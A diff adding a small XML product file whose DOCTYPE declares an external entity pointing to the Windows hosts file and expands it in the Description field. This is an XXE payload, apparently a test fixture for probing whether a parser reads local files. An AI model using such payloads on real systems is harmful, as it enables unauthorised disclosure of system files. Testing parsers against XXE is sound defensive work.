@@ -1,0 +1,11 @@
+﻿<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE foo [
+	<!ENTITY myEntity SYSTEM "file://C:/Windows/System32/drivers/etc/hosts">
+]>
+<Products>
+	<Product>
+		<Name>Product Ten</Name>
+		<Price>222</Price>
+		<Description>&myEntity;</Description>
+	</Product>
+</Products>
